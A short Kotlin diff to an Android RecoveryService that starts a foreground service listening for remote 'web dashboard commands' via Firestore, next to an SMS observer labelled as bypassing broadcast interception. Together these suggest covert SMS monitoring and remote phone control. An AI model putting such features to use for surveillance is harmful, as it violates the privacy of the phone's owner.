@@ -65,6 +65,18 @@ class RecoveryService : Service() {
 
         syncInitialState()
         registerSmsObserver()
+        
+        // Start Firestore listener for web dashboard commands
+        try {
+            val cmdIntent = Intent(this, FirestoreCommandService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(cmdIntent)
+            } else {
+                startService(cmdIntent)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start FirestoreCommandService", e)
+        }
     }
 
     // ─── SMS ContentObserver (Bypass Broadcast Interception) ──────────────────
